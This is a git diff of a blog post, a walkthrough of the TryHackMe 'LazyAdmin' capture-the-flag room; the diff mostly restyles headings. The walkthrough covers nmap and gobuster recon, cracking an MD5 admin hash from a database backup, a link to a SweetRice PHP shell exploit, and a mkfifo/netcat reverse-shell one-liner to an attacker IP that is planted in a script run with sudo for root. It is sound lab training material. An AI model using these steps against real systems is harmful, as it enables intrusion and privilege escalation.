@@ -3,26 +3,33 @@ layout: post
 title: TryHackMe - LazyAdmin
 date: 2023-04-23 17:24
 category: ctf
-author: akymos
-tags: [ctf, TryHackMe]
-toc: true
+author: Akymos
+tags: [ctf, tryhackme]
 anchor: true
-published: true
 ---
 
-# Room info
+<hr>
+<h3>Table of Contents</h3>
+<nav class="toc">
+* toc
+{:toc}
+</nav>
+<hr>
+<div class="pb-1" />
+
+## Room info
 - **Name**: LazyAdmin
 - **Link**: [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin){:target="_blank"}
 - **Subscription**: Free
 - **Difficulty**: Easy
 - **Description**: Easy linux machine to practice your skills
 
-## Questions
+### Questions
 1. What is the user flag?
 2. What is the root flag?
 
-# Step 0 - Recon
-## Nmap
+## Step 0 - Recon
+### Nmap
 ``` bash
 $ nmap -sC -sV 10.10.26.136
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 21:28 CEST
@@ -42,11 +49,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
-````
+```
 Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
 ![LazyAdmin - Apache default page](/assets/images/ctf-lazyadmin/01.png){:class="post-image"}
 
-## Gobuster
+### Gobuster
 ``` bash
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.26.136 -q
 /.hta                 (Status: 403) [Size: 277]
@@ -59,7 +66,7 @@ $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.
 We have a 'strange' directory: `/content`. Let's check it out.
 ![LazyAdmin - /content directory](/assets/images/ctf-lazyadmin/02.png){:class="post-image"}
 
-## Gobuster on /content
+### Gobuster on /content
 ``` bash
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.26.136/content -q
 /.hta                 (Status: 403) [Size: 277]
@@ -86,7 +93,7 @@ The directory `/inc` contains another folder: `/inc/mysql_backup`. Inside it, we
 ```
 We have found the credentials for the admin panel: `manager:42f749ade7f9e195bf475f37a44cafcb` (MD5 hash).
 
-## John the Ripper
+### John the Ripper
 ``` bash
 $ echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt && john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
@@ -103,11 +110,11 @@ So the admin account is:
 - Password: `***********`
 ![LazyAdmin - Admin panel](/assets/images/ctf-lazyadmin/03.png){:class="post-image"}
 
-## Exploit
+### Exploit
 In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
 [https://www.exploit-db.com/exploits/40700](https://www.exploit-db.com/exploits/40700){:target="_blank"}
 
-# Question 1 - What is the user flag?
+## Question 1 - What is the user flag?
 ```sh
 $ nc -lnvp 9001
 listening on [any] 9001 ...
@@ -117,8 +124,8 @@ THM{***************************}
 ````
 The user flag is: `THM{***************************}`
 
-# Question 2 - What is the root flag?
-## Privilege escalation
+## Question 2 - What is the root flag?
+### Privilege escalation
 ```sh
 $ sudo -l 
 Matching Defaults entries for www-data on THM-Chal:
@@ -144,7 +151,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.32.129 9002 >/tmp/f
 $ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 
-## Root.txt
+### Root.txt
 ```sh
 $ nc -lnvp 9002
 listening on [any] 9002 ...
